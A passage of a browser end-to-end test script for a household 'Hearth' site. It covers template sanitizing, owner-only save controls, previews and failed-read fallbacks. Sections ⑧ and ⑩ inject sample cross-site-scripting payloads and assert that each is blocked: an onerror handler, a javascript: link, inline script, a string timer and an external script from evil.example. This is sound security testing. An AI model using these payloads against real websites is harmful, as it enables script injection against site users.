          barShown: getComputedStyle(bar).display !== "none" && r.height > 10, barOnTop: bar.contains(top), barBox: [Math.round(r.left), Math.round(r.top), Math.round(r.width), Math.round(r.height)], topIs: top ? top.tagName + "." + top.className : null,
          pickerShown: !!document.querySelector("[data-hearth-pick]")?.offsetParent,
          navShown: getComputedStyle(document.querySelector("nav") ?? document.body).display !== "none",
          stageBox: (() => { const b = stage.getBoundingClientRect(); return [Math.round(b.left), Math.round(b.top), Math.round(b.width), Math.round(b.height)]; })(),
        };
      });
      check("⑧ no template code ran: nothing set window.__pwned", state.pwned === null, state.pwned);
      check("⑧ the stage is the hostile entry, and holds no script, frame, form, input, style, link or svg", state.entry === "hostile" && state.banned === 0, JSON.stringify(state));
      check("⑧ no event handler and no javascript: link on the stage", state.handlers.length === 0 && state.links === 0, JSON.stringify(state.handlers));
      check("⑧ its CSS could not cover or hide the site's own chrome (bar, picker, nav)", state.barShown && state.barOnTop && state.pickerShown && state.navShown, JSON.stringify(state));
      check("⑧ the private slots it placed stay the house's: the owner's Needs you is the site's own slot, drawn by the site, and the template received nothing", (await visible(page, "[data-hearth-slot=needs-you]")) && !(await page.evaluate(() => JSON.stringify(window.__pwned ?? "")).then((v) => /awaiting|waiting/.test(v))));
      check("⑧ and the site's strip is on top, whole, under that template's every trick", await page.evaluate(() => { const b = document.querySelector("[data-hearth-bar]"); b.scrollIntoView({ block: "start", behavior: "instant" }); const r = b.getBoundingClientRect(); const top = document.elementFromPoint(r.left + 30, r.top + Math.min(r.height - 4, 10)); return getComputedStyle(b).display !== "none" && r.height > 15 && b.contains(top); }));
      check("⑧ nothing went to the hostile host", unanswered.slice(before).every((u) => !/evil\.example/.test(u)) && log.every((l) => !/evil/.test(l.path)), unanswered.slice(before).join(" "));
      await shot(page, "08-hostile-template-desktop", { fullPage: true });
      await cleanUnderPolicy(page, "⑧");
      await page.context().close();
      injectEntry = null;
    }

    // ── ⑨ the town repo's STARTER, as a submission would be: clean, every slot, and the sort and single-open behaviors ──
    {
      const TOWN = process.env.TOWN ?? "/home/seat/trees/pool/town-1";
      const dir = path.join(TOWN, "PROJECTS", "household-hearths", "STARTER");
      if (!fs.existsSync(dir)) record("⑨ the STARTER kit", false, "no town checkout at " + TOWN);
      else {
        const starter = prepareEntry({ id: "starter-kit", title: "Starter", author: "starter", line: "", html: fs.readFileSync(path.join(dir, "hearth.html"), "utf8"), css: fs.readFileSync(path.join(dir, "hearth.css"), "utf8") });
        check("⑨ the STARTER kit is clean (the sanitizer removes nothing) and uses every slot", starter.ok && starter.problems.length === 0 && starter.slots.length === SLOT_COUNT, JSON.stringify(starter.problems));
        injectEntry = starter;
        const page = await newPage(browser);
        await page.goto(`${BASE}/households/${B_SLUG}/?entry=starter-kit`, { waitUntil: "load" });
        await ready(page);
        const order = () => page.locator("[data-hearth-behavior=sort] > li").allInnerTexts();
        check("⑨ sort: listed order to begin with", (await order()).join("|") === "Birch, 3|Ash, 12|Cedar, 7", (await order()).join("|"));
        await page.selectOption(".hx-sort-select", "size:desc");
        check("⑨ sort: a real choice reorders by size, descending", (await order()).join("|") === "Ash, 12|Cedar, 7|Birch, 3", (await order()).join("|"));
        await page.selectOption(".hx-sort-select", "name");
        check("⑨ sort: by name, ascending", (await order()).join("|") === "Ash, 12|Birch, 3|Cedar, 7");
        await page.selectOption(".hx-sort-select", "");
        check("⑨ sort: back to as listed", (await order()).join("|") === "Birch, 3|Ash, 12|Cedar, 7");
        const heads = page.locator("[data-hearth-behavior=accordion] .hx-acc-head");
        await heads.nth(1).click();
        check("⑨ accordion with data-single: opening one closes the other", (await heads.nth(0).getAttribute("aria-expanded")) === "false" && (await heads.nth(1).getAttribute("aria-expanded")) === "true");
        await shot(page, "09-starter-kit-desktop", { fullPage: true });
        await cleanUnderPolicy(page, "⑨");
        await page.context().close();
        injectEntry = null;
      }
    }

    // ── ⑩ the policy is a SECOND layer: what a sanitizer bug would let through still does not run ──
    {
      const before = unanswered.length;
      const page = await newPage(browser, { signedIn: true });
      await page.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(page);
      await page.evaluate(() => {
        window.__cspv = [];
        const stage = document.querySelector("[data-hearth-stage]");
        const host = document.createElement("div");
        host.id = "csp-probe";
        // what an unsanitized template could carry: an inline handler that fires, and a javascript: link
        host.innerHTML = '<img src="/media/does-not-exist.png" onerror="window.__pwned=\'handler\'"><a id="jslink" href="javascript:window.__pwned=\'href\'">run</a>';
        stage.appendChild(host);
        // an inline script written in by script, an external one from another host, eval, and Function
        const sc = document.createElement("script"); sc.textContent = "window.__pwned='inline'"; stage.appendChild(sc);
        const ext = document.createElement("script"); ext.src = "https://evil.example/x.js"; stage.appendChild(ext);
        // string-to-code (a string timer): DevTools-run code is exempt from the eval rule itself, but a timer the PAGE runs is not
        setTimeout("window.__pwned='timer'", 0);
      });
      await page.locator("#jslink").click();                  // a real click on the javascript: link
      await page.waitForTimeout(700);
      const st = await page.evaluate(() => ({ pwned: window.__pwned ?? null, v: window.__cspv }));
      check("⑩ no injected code ran: handler, javascript: link, inline script, external script, string timer", st.pwned === null, JSON.stringify(st));
      check("⑩ the policy says so: inline handler, inline script, javascript: link, the string timer and the external script were each refused", ["inline", "eval", "evil.example"].every((k) => st.v.some((x) => x.includes(k))), JSON.stringify(st.v));
      check("⑩ the external script's host was never contacted", unanswered.slice(before).every((u) => !/evil\.example/.test(u)), unanswered.slice(before).join(" "));
      await page.evaluate(() => { window.__cspv = []; document.getElementById("csp-probe")?.remove(); });
      await page.getByRole("tab", { name: "Marks" }).click();
      check("⑩ and the host's own controls still answer a real click after all that", await visible(page, "[data-hx-marks]"));
      await cleanUnderPolicy(page, "⑩ (after the probe)");
      await page.context().close();
    }

    // ── ⑪ ONE PAGE (POS-984, rebuilt): the Hearth draws the house for everyone and is the whole page; one thin strip is the site's ──
    {
      // a visitor: the design (with its own sign-in line in the house slot), the dropdown, and nothing of an owner's
      const v = await newPage(browser);
      await v.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(v);
      check("⑪ a visitor sees the design (the house slot), and its sign-in line, which is the design's own", (await visible(v, "[data-hearth-slot=house]")) && /Is this your house\?/.test((await text(v, "[data-hearth-slot=house] .hx-public")) ?? "") && (await visible(v, "[data-hearth-slot=house] [data-hd-signin]")));
      check("⑪ and the strip: the breadcrumb and the Hearth dropdown, enabled, for a visitor too", (await visible(v, "[data-hearth-bar] .hearth-crumbs")) && (await visible(v, "[data-hearth-bar] [data-hearth-pick]")) && (await v.locator("[data-hearth-pick]").isEnabled()));
      check("⑪ and none of an owner's: no band, no Needs you, no boat line, no quests, no managing the house, no + add a resident, no likeness answer, no save", !(await v.locator("[data-hband]").count()) && !(await visible(v, "[data-hd-needs-box]")) && !(await visible(v, "[data-hd-boat]")) && !(await visible(v, "[data-quests]")) && !(await visible(v, "[data-house-add]")) && !(await visible(v, ".hearth-likeness")) && !(await visible(v, "[data-hearth-owner]")) && !(await visible(v, "[data-hearth-save]")));
      check("⑪ exactly one sign-in line on the page", (await v.locator("[data-hd-signin]:visible").count()) === 1);
      // until 2026-11-11: "no pill rail above the Hearth". POS-999 put the household's sub-rail in the strip: the household's chip lit, a chip per resident, and still no old tab rail
      check("⑪ the household's sub-rail above the Hearth: its own chip lit, a chip per resident, and no old tab rail or nav row", (await v.locator("[data-hearth-bar] [data-house-rail] a[data-house-link][aria-current=page]").count()) === 1 && (await v.locator("[data-hearth-bar] [data-house-rail] [data-rail-chip]").count()) === A.length && (await v.locator("[data-house-tabs], [data-house-tab], .pm-chiprow, [role=tablist].house-tabs").count()) === 0);
      await shot(v, "10-one-page-visitor-desktop", { fullPage: true });
      await cleanUnderPolicy(v, "⑪ (visitor)");
      await v.context().close();

      // the owner, desktop: the strip, then the design
      log.length = 0;
      const o = await newPage(browser, { signedIn: true });
      await o.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(o);
      await o.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
      await o.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });
      // POS-999: the + is the sub-rail's round pill and the likeness answer is in the settings panel, in the corner beside the dropdown
      check("⑪ the owner's strip: the +, and the settings beside the dropdown, the likeness answer in its panel (closed until asked)", (await visible(o, "[data-hearth-bar] [data-house-add]")) && (await visible(o, "[data-hearth-bar] .hearth-gear")) && !(await visible(o, "[data-hearth-bar] .hearth-likeness")) && /likeness question/.test((await text(o, "[data-hearth-bar] .hearth-likeness")) ?? "") && (await visible(o, "[data-hearth-bar] [data-hearth-pick]")), await text(o, "[data-hearth-bar] [data-hearth-own]"));
      await o.locator("[data-hearth-bar] .hearth-gear").click();
      check("⑪ the settings open on a click, and the likeness answer is there", await visible(o, "[data-hearth-bar] .hearth-likeness a"));
      await o.keyboard.press("Escape");
      check("⑪ and Escape closes them", !(await visible(o, "[data-hearth-bar] .hearth-likeness")));
      check("⑪ the likeness answer links to the office's own page for THIS house", ((await o.locator("[data-hearth-bar] .hearth-likeness a").getAttribute("href")) ?? "").includes(`/oauth/likeness?household=${A_SLUG}`), await o.locator("[data-hearth-bar] .hearth-likeness a").getAttribute("href"));
      check("⑪ the design draws Needs you and the waiting-mail line for its owner, and Edit profile on each resident's card", (await visible(o, "[data-hearth-slot=needs-you]")) && (await visible(o, "[data-hd-boat]")) && (await o.locator("[data-hearth-slot=residents] [data-hd-edit]:visible").count()) === A.length);
      check("⑪ the visitor's sign-in line is gone for the owner", (await o.locator("[data-hd-signin]:visible").count()) === 0);
      check("⑪ no band, no quests, no ballots, no managing the house on the owner's page either", !(await o.locator("[data-hband], [data-quests], [data-hband-ballots], .bs-form, [data-hb-ballot]").count()) && !(await o.content()).includes("Managing the house"));
      check("⑪ the strip is above the design", await o.evaluate(() => document.querySelector("[data-hearth-bar]").getBoundingClientRect().bottom <= document.querySelector("[data-hearth-stage]").getBoundingClientRect().top + 1));
      // until 2026-11-11 the corner was the words "your household" as one link; POS-999 made it a round household icon and the residents' faces
      check("⑪ the header's corner: the household icon goes to YOUR household, and a face per resident to its own page", await (async () => {
        await o.waitForFunction((n) => document.querySelectorAll("[data-auth-handles] .pm-corner-face").length === n, A.length, { timeout: 15000 }).catch(() => {});
        const links = await o.locator("[data-auth-handles] a").evaluateAll((as) => as.map((a) => [a.className, a.getAttribute("href")]));
        const want = [["pm-corner-house", `/households/${A_SLUG}/`], ...A.map((h) => ["pm-corner-face", `/residents/${h}/`])];
        return JSON.stringify(links) === JSON.stringify(want) ? true : JSON.stringify(links);
      })());
      await shot(o, "11-one-page-owner-desktop", { fullPage: true });
      await cleanUnderPolicy(o, "⑪ (owner)");

      // a resident's card is a link to that resident's own page, whose editor opens from the card's Edit profile
      await o.locator(`[data-hearth-slot=residents] [data-hd-card="${A[0]}"] [data-hd-edit]`).click();
      await o.waitForURL((u) => u.pathname === `/residents/${A[0]}/`, { timeout: 15000 });
      check("⑪ a card's Edit profile goes to that resident's own page with the editor's ask", new URL(o.url()).searchParams.get("edit") === "profile", o.url());
      await o.locator(`[data-member="${A[0]}"] [data-profile-edit-form]:not([hidden])`).waitFor({ timeout: 15000 }).catch(() => {});
      check("⑪ and the profile editor opens for the owner there", await visible(o, `[data-member="${A[0]}"] [data-profile-edit-form]`));
      await shot(o, "12-one-page-resident-own-page-desktop");

      // ?resident=<h> (the old address of a tab) redirects to the resident's own page; the rest of the query and the fragment ride across
      await o.goto(`${BASE}/households/${A_SLUG}/?resident=${encodeURIComponent(A[1] ?? A[0])}&edit=profile#home`, { waitUntil: "load" });
      await o.waitForURL((u) => u.pathname === `/residents/${A[1] ?? A[0]}/`, { timeout: 15000 });
      check("⑪ a deep link ?resident=<h> redirects to /residents/<h>/, the ask for the editor and the fragment riding across", new URL(o.url()).search === "?edit=profile" && new URL(o.url()).hash === "#home", o.url());
      await o.goto(`${BASE}/households/${A_SLUG}/?resident=not-of-this-house`, { waitUntil: "load" });
      await ready(o);
      check("⑪ a handle that is not of this house is not followed: the household page shows", new URL(o.url()).pathname === `/households/${A_SLUG}/` && (await o.locator("[data-hearth-stage]").count()) === 1, o.url());

      // the old address forwards, the preview's query riding across
      await o.goto(`${BASE}/households/${A_SLUG}/hearth/?entry=ledger`, { waitUntil: "load" });
      await o.waitForURL((u) => u.pathname === `/households/${A_SLUG}/`, { timeout: 15000 });
      await ready(o);
      check("⑪ /hearth/ forwards to the one page and ?entry=ledger still previews there", new URL(o.url()).searchParams.get("entry") === "ledger" && (await o.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "ledger", o.url());
      await o.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });
      check("⑪ the strip stays whole under a previewed design", (await visible(o, "[data-hearth-bar] [data-house-add]")) && (await visible(o, "[data-hearth-bar] [data-hearth-pick]")) && (await o.locator("[data-hd-needs-box]").count()) === 1);
      await shot(o, "13-one-page-owner-ledger-preview-desktop", { fullPage: true });

      // a resident's page links to its household
      await o.goto(`${BASE}/residents/${A[0]}/`, { waitUntil: "load" });
      const chip = o.locator("a[data-house-link]");
      check("⑪ a resident's page: the rail's first chip is a link to the household", (await chip.count()) === 1 && (await chip.getAttribute("href")) === `/households/${A_SLUG}/`);
      await chip.click();
      await o.waitForURL((u) => u.pathname === `/households/${A_SLUG}/`, { timeout: 15000 });
      check("⑪ and it lands on the household page", await o.locator("[data-hearth-stage]").count() === 1);
      await o.context().close();

      // a FIRST sign-in (review, small): the token is there, GET /me has not answered, and nobody knows yet whether this is the house's own
      // human. "This isn't your house" must not flash for the owner, and must still come for another house's sign-in once /me has answered.
      const watchNotYours = (p) => p.addInitScript(() => {
        window.__notYoursShown = false;
        new MutationObserver(() => { for (const n of document.querySelectorAll("[data-hx-notyours]")) if (!n.hidden) window.__notYoursShown = true; })
          .observe(document, { subtree: true, attributes: true, childList: true, attributeFilter: ["hidden"] });
      });
      const first = await newPage(browser, { signedIn: true, pendingMe: 2500 });
      await watchNotYours(first);
      await first.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await first.waitForSelector("[data-hearth-stage]");
      await first.waitForTimeout(900);
      check("⑪ first sign-in, /me still pending: the page says nothing about whose house this is, and shows no owner link or private slot", !(await visible(first, "[data-hx-notyours]")) && !(await visible(first, "[data-hd-signin]")) && !(await visible(first, "[data-hd-needs-box]")) && !(await visible(first, "[data-hearth-bar] [data-house-add]")));
      await first.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 20000 });
      await first.waitForTimeout(400);
      check("⑪ and once /me has answered, the owner's own parts are there and 'This isn't your house' never showed, not even for a frame", (await visible(first, "[data-hearth-bar] [data-house-add]")) && (await visible(first, "[data-hearth-slot=needs-you]")) && (await first.evaluate(() => window.__notYoursShown)) === false);
      await first.context().close();
      const other = await newPage(browser, { signedIn: true, pendingMe: 2500 });
      await watchNotYours(other);
      await other.goto(`${BASE}/households/${B_SLUG}/`, { waitUntil: "load" });
      await other.waitForSelector("[data-hearth-stage]");
      await other.waitForTimeout(900);
      check("⑪ another house's first sign-in, /me still pending: no verdict yet", !(await visible(other, "[data-hx-notyours]")) && (await other.evaluate(() => window.__notYoursShown)) === false);
      await other.waitForSelector("[data-hx-notyours]:not([hidden])", { timeout: 20000 });
      check("⑪ and once /me has answered, it says plainly that this is not their house", /isn’t your house/.test((await text(other, "[data-hx-notyours]")) ?? ""));
      await other.context().close();

      // the owner on a phone: the strip, then the design, whole
      const ph = await newPage(browser, { signedIn: true, viewport: { width: 390, height: 800 } });
      await ph.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(ph);
      await ph.waitForSelector("[data-hearth-bar] [data-hearth-own]:not([hidden])", { timeout: 15000 });
      check("⑪ the owner's page at 390px: no sideways scroll", (await ph.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(ph, "14-one-page-owner-phone", { fullPage: true });
      await ph.context().close();
      const vp = await newPage(browser, { viewport: { width: 390, height: 800 } });
      await vp.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(vp);
      check("⑪ the visitor's page at 390px: no sideways scroll", (await vp.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)) <= 1);
      await shot(vp, "15-one-page-visitor-phone", { fullPage: true });
      await vp.context().close();
    }

    // ── ⑬ THE HOUSEHOLD PAGE HAS NO BALLOT; /votes/ HAS THE STAKE FORM (POS-984, rebuilt: Darko, 2026-11-10 17:14–17:28 EST) ──
    // Until then the band hosted POS-502's stake form for the owner. The form is /votes/'s alone, and mounts there only for a signed-in household.
    {
      tally = { "the-ledger": 11, "starter-kit": 3 };
      ballotOpen = true;
      // the household page, visitor and owner: nothing about a ballot is read, drawn or loaded
      for (const [who, signedIn] of [["a visitor", false], ["the house's own human", true]]) {
        log.length = 0;
        const p = await newPage(browser, { signedIn });
        await p.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
        await ready(p);
        if (signedIn) await p.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
        await p.waitForTimeout(800);
        check(`⑬ ${who}: the household page shows no ballot and no stake form, and never reads /votes`, (await p.locator(".bs-form, [data-hb-ballot], [data-hband-ballots]").count()) === 0 && !log.some((l) => l.path.startsWith("/votes")), JSON.stringify(log.filter((l) => l.path.startsWith("/votes"))));
        await p.context().close();
      }
      // /votes/: the open ballot, and the stake form for a signed-in household only
      log.length = 0;
      const vv = await newPage(browser);
      await vv.goto(`${BASE}/votes/`, { waitUntil: "load" });
      await vv.waitForSelector("[data-stake-slot] .bs-gate, [data-stake-slot] .bs-head", { timeout: 20000 });
      check("⑬ /votes/ lists the open ballot, and a visitor's stake slot has no form to fill in", /Hearth Contest/i.test((await text(vv, "[data-votes]")) ?? "") && !(await visible(vv, ".bs-form")), await text(vv, "[data-stake-slot]"));
      await vv.context().close();
      const vo = await newPage(browser, { signedIn: true });
      await vo.goto(`${BASE}/votes/`, { waitUntil: "load" });
      await vo.waitForSelector(".bs-form:not([hidden])", { timeout: 20000 });
      check("⑬ and the signed-in household's own residents are in the form there: the stake is still the site's (POS-502)", await vo.evaluate((names) => [...document.querySelectorAll('.bs-form [name="from"] option')].map((x) => x.value).join() === names.join(), A));
      await vo.context().close();
    }

    // ── ⑭ A SAVED HEARTH (POS-962 folded into the one page): visitors see the kept design, and the dropdown PREVIEWS for them (anyone may); ?entry= previews over it
    //     without saving; only the signed-in human's controls, in the strip, save, behind a second yes ──
    {
      const patches = () => log.filter((l) => l.path === `/households/${A_SLUG}/hearth`);
      const showing = (p) => p.locator("[data-hearth]").getAttribute("data-hearth-showing");
      const settleOn = (p, id) => p.waitForFunction((want) => document.querySelector("[data-hearth]")?.dataset.hearthShowing === want, id, { timeout: 15000 });
      savedHearth = "ledger";
      log.length = 0;
      const v = await newPage(browser);
      await v.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(v);
      await settleOn(v, "ledger");
      check("⑭ a visitor sees the house's kept design (the ledger), drawn after the public read", (await showing(v)) === "ledger" && (await v.locator("[data-hearth-stage]").getAttribute("data-hearth-entry")) === "ledger");
      await v.waitForFunction(() => document.querySelector("[data-hearth-pick]")?.disabled === false, null, { timeout: 15000 });
      check("⑭ the dropdown is there for a visitor, enabled, on the kept design; and no save controls, no owner block, nothing to change the kept choice with", (await visible(v, "[data-hearth-pick]")) && (await v.locator("[data-hearth-pick]").isEnabled()) && (await v.locator("[data-hearth-pick]").inputValue()) === "ledger" && !(await visible(v, "[data-hearth-save]")) && !(await visible(v, "[data-hearth-clear]")) && !(await visible(v, "[data-hearth-owner]")));
      check("⑭ the choice was read signed out: no bearer on the households read", log.filter((l) => l.path.startsWith("/households") && l.auth).length === 0 && log.some((l) => l.path.startsWith("/households?h=")), JSON.stringify(log.filter((l) => l.path.startsWith("/households"))));
      await shot(v, "19-saved-hearth-visitor-desktop", { fullPage: false });
      await cleanUnderPolicy(v, "⑭ (a visitor, a saved Hearth)");
      await v.goto(`${BASE}/households/${A_SLUG}/?entry=default`, { waitUntil: "load" });
      await ready(v);
      await v.waitForTimeout(1200);
      check("⑭ ?entry=default previews over the saved choice, on this visit", (await showing(v)) === "default", await showing(v));
      check("⑭ and writes nothing: no PATCH went out", patches().length === 0);
      await v.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await settleOn(v, "ledger");
      check("⑭ without the preview in the address the kept design is back: the preview was never saved", (await showing(v)) === "ledger" && savedHearth === "ledger");
      // A VISITOR PREVIEWS (Darko, 17:28 EST: "anyone can preview another Hearth with it"): a real choice in the dropdown draws that design, keeps only the address, says it is
      // not saved, and sends nothing; no save control appears for them.
      log.length = 0;
      await v.selectOption("[data-hearth-pick]", "default");
      await v.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing === "default", null, { timeout: 15000 });
      check("⑭ a visitor's dropdown previews the default over the kept design: drawn, ?entry=default in the address, 'not saved' said, nothing sent, and still no save control", new URL(v.url()).searchParams.get("entry") === "default" && /Previewing .*not saved/.test((await text(v, "[data-hearth-bar] [data-hearth-preview-line]")) ?? "") && patches().length === 0 && !(await visible(v, "[data-hearth-save]")) && !(await visible(v, "[data-hearth-owner]")) && savedHearth === "ledger", `${v.url()} ${await text(v, "[data-hearth-bar] [data-hearth-preview-line]")}`);
      // FORCED (review of 80af398fb): the save controls are hidden for a non-owner. Drive them through the DOM as a script would: a click on save and on the confirm.
      // Nothing may be asked or written, and the address stays as it was.
      const force = async (p) => {
        const before = await showing(p);
        await p.evaluate(() => { for (const sel of ["[data-hearth-save]", "[data-hearth-clear]", "[data-hearth-confirm-yes]"]) document.querySelector(sel)?.click(); });
        await p.waitForTimeout(700);
        return { before, after: await showing(p), address: new URL(p.url()).search, asked: await p.evaluate(() => { const c = document.querySelector("[data-hearth-confirm]"); return !!c && !c.hidden; }) };
      };
      log.length = 0;
      const fv = await force(v);
      check("⑭ a visitor's FORCED save and confirm ask nothing, change nothing, and send NOTHING", fv.after === fv.before && !fv.asked && fv.address === "?entry=default" && patches().length === 0, JSON.stringify({ ...fv, patches: patches().length }));
      await v.context().close();

      // the signed-in human of ANOTHER house: the dropdown, and no owner controls, on house B's page
      const x = await newPage(browser, { signedIn: true });
      await x.goto(`${BASE}/households/${B_SLUG}/`, { waitUntil: "load" });
      await ready(x);
      await x.waitForSelector("[data-hx-notyours]:not([hidden])", { timeout: 15000 });
      await x.waitForTimeout(500);
      check("⑭ a signed-in reader of another house has the dropdown to preview with, and no save controls, no add-a-resident, no likeness answer", (await visible(x, "[data-hearth-pick]")) && !(await visible(x, "[data-hearth-owner]")) && !(await visible(x, "[data-hearth-bar] [data-house-add]")) && !(await visible(x, "[data-hearth-bar] .hearth-likeness")));
      log.length = 0;
      const fx = await force(x);
      check("⑭ and that reader's FORCED save and confirm, with their own valid bearer, ask nothing and send NOTHING to any house", fx.after === fx.before && !fx.asked && log.filter((l) => l.path.includes("/hearth") && l.path.startsWith("/households/")).length === 0, JSON.stringify({ ...fx, sent: log.filter((l) => l.path.startsWith("/households/")) }));
      await x.context().close();

      // the owner: the dropdown and the save controls in the strip, a preview (nothing sent), a second yes, the save
      log.length = 0;
      const o = await newPage(browser, { signedIn: true });
      await o.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(o);
      await o.waitForSelector("[data-hearth-bar] [data-hearth-owner]:not([hidden])", { timeout: 20000 });
      await settleOn(o, "ledger");
      check("⑭ the owner's controls are in the strip, above the design, and say what is kept", /^This house’s Hearth: The ledger\.$/.test((await text(o, "[data-hearth-bar] p[data-hearth-saved]")) ?? "") && await o.evaluate(() => !!(document.querySelector("[data-hearth-bar] [data-hearth-picker]").compareDocumentPosition(document.querySelector("[data-hearth-stage]")) & Node.DOCUMENT_POSITION_FOLLOWING)));
      await o.selectOption("[data-hearth-pick]", "default");
      await o.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing === "default");
      check("⑭ the dropdown previews the default over the kept choice, in the address, and says it is not saved", new URL(o.url()).searchParams.get("entry") === "default" && /Previewing .*not saved/.test((await text(o, "[data-hearth-bar] [data-hearth-preview-line]")) ?? "") && patches().length === 0);
      await o.click("[data-hearth-save]");
      check("⑭ 'Make this our Hearth' only raises a question; nothing is sent", (await visible(o, "[data-hearth-confirm]")) && /back to the default Hearth for everyone/.test((await text(o, "[data-hearth-question]")) ?? "") && patches().length === 0, await text(o, "[data-hearth-question]"));
      await o.click("[data-hearth-confirm-no]");
      check("⑭ 'Not now' drops the question; still nothing sent", !(await visible(o, "[data-hearth-confirm]")) && patches().length === 0);
      await o.click("[data-hearth-save]");
      await o.click("[data-hearth-confirm-yes]");
      await o.waitForFunction(() => /Saved\./.test(document.querySelector("[data-hearth-said]")?.textContent ?? ""), null, { timeout: 10000 });
      check("⑭ the second yes sends ONE save, with the owner's bearer, back to the default (null)", patches().length === 1 && patches()[0].auth === `Bearer ${OWNER_TOKEN}` && savedHearth === null, JSON.stringify(patches()));
      check("⑭ and says it is saved; the address is clean (the saved choice is the default now)", /This house now uses the default Hearth/.test((await text(o, "[data-hearth-said]")) ?? "") && !new URL(o.url()).searchParams.has("entry"), o.url());
      await shot(o, "20-saved-hearth-owner-picker-desktop", { fullPage: false });
      await o.selectOption("[data-hearth-pick]", "ledger");
      await o.click("[data-hearth-save]");
      await o.click("[data-hearth-confirm-yes]");
      await o.waitForFunction(() => /Saved\. The ledger is now/.test(document.querySelector("[data-hearth-said]")?.textContent ?? ""), null, { timeout: 10000 });
      check("⑭ saving the ledger sends a second save, and the office now keeps it", patches().length === 2 && savedHearth === "ledger", JSON.stringify(patches().map((p) => p.status)));
      await cleanUnderPolicy(o, "⑭ (the owner's picker, two saves)");
      await o.context().close();
      const again = await newPage(browser);
      await again.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await settleOn(again, "ledger");
      check("⑭ a visitor arriving after sees the newly kept design", (await showing(again)) === "ledger");
      await again.context().close();
    }

    // ── ⑮ A FAILED CHOICE READ: the default is drawn, and the page says so ──
    {
      savedHearth = "ledger";
      fail = new Set(["/households"]);
      const f = await newPage(browser);
      await f.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(f);
      await f.waitForFunction(() => /could not be read just now; showing the default/.test(document.querySelector("[data-hearth-note]")?.textContent ?? ""), null, { timeout: 15000 });
      check("⑮ the choice read fails: the default is drawn (not the kept design, not a blank), and the page says the read failed", (await f.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default" && (await visible(f, "[data-hearth-note]")), await text(f, "[data-hearth-note]"));
      await f.waitForFunction(() => document.querySelector("[data-hearth-pick]")?.disabled === false, null, { timeout: 15000 });
      check("⑮ and the dropdown still previews for a visitor on a failed read (it starts from what the build carried), with no save control", (await visible(f, "[data-hearth-pick]")) && (await f.locator("[data-hearth-pick]").isEnabled()) && !(await visible(f, "[data-hearth-owner]")) && !(await visible(f, "[data-hearth-save]")));
      await shot(f, "21-saved-hearth-read-failed-desktop", { fullPage: false });
      await f.context().close();
      // the same, as the house's OWN human: the SAVE is not offered on a failed read (the kept choice is not known, so nothing is offered to save over it); the dropdown still previews
      const fo = await newPage(browser, { signedIn: true });
      await fo.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await ready(fo);
      await fo.waitForSelector("[data-hearth-slot=needs-you]:not([hidden])", { timeout: 15000 });
      await fo.waitForFunction(() => /could not be read just now/.test(document.querySelector("[data-hearth-note]")?.textContent ?? ""), null, { timeout: 15000 });
      await fo.waitForTimeout(600);
      check("⑮ as the owner too: the default is drawn, the page says the read failed, and the strip offers no save and no saved line (the dropdown still previews)", (await fo.locator("[data-hearth]").getAttribute("data-hearth-showing")) === "default" && (await visible(fo, "[data-hearth-pick]")) && !(await visible(fo, "[data-hearth-owner]")) && !(await visible(fo, "[data-hearth-save]")) && !(await visible(fo, "p[data-hearth-saved]")), await text(fo, "[data-hearth-bar]"));
      await shot(fo, "22-saved-hearth-read-failed-owner-desktop", { fullPage: false });
      await fo.context().close();
      fail = new Set();
      savedHearth = null;
    }

    // ── ⑯ THE SAVED CHOICE BAKED AT BUILD (review of 80af398fb): the first draw starts from the build's copy, so the default does not flash; the browser read corrects it ──
    {
      const showingOf = (p) => p.locator("[data-hearth]").getAttribute("data-hearth-showing");
      // (a) the build carried "ledger" (the document is rewritten to say so); the office takes 3s to answer: the page is on the ledger BEFORE the read lands
      injectBaked = "ledger"; savedHearth = "ledger"; householdsDelay = 3000;
      log.length = 0;
      const b = await newPage(browser);
      await b.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
      await b.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing === "ledger", null, { timeout: 2500 }).catch(() => {});
      check("⑯ a baked saved choice: the page is on it before the browser read has answered (no flash of the default)", (await showingOf(b)) === "ledger" && !log.some((l) => l.path.startsWith("/households?h=")), `${await showingOf(b)} ${JSON.stringify(log.filter((l) => l.path.startsWith("/households")))}`);
      await b.waitForFunction(() => document.querySelector("[data-hearth]")?.dataset.hearthShowing === "ledger", null, { timeout: 8000 });
      await b.waitForTimeout(3500);
      check("⑯ and the read, when it lands, agrees: still the ledger, nothing to say", (await showingOf(b)) === "ledger" && !(await visible(b, "[data-hearth-note]")) && log.some((l) => l.path.startsWith("/households?h=")));
      await b.context().close();
      // (b) a STALE bake: the build said "ledger", the office now says the house chose nothing: the read corrects it
      householdsDelay = 0; savedHearth = null;
      const s = await newPage(browser);
      await s.goto(`${BASE}/households/${A_SLUG}/`, { waitUntil: "load" });
